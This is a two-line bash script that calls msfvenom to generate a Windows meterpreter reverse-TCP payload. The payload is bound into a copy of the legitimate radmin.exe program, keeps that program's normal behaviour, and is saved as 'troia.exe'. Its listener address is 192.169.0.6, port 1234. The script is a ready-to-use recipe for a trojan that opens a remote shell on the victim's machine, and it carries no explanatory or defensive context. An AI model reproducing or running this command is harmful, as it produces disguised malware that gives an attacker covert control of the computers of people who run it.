#!/bin/bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.6 LPORT=1234 -x /root/Documents/SCRIPTS/sec/msf/win_bin/radmin.exe -k -f exe > troia.exe

